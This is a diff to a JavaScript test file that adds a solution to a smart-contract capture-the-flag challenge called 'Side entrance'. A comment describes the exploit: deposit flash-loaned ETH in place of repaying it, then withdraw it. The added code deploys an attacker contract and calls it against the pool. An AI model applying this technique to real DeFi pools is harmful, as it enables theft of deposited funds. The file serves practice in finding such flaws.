@@ -26,6 +26,14 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * We notice that during a flashloan, we can deposit ETH instead of repaying.
+         * This will then allow us to withdraw the ETH from the pool.
+         * We must deploy a contract to interract with the pool.
+         */
+        const attackContract = await ethers.getContractFactory('SideEntranceAttacker', player);
+        const attacker = await attackContract.deploy(pool.address);
+        await attacker.connect(player).attack();
     });
 
     after(async function () {
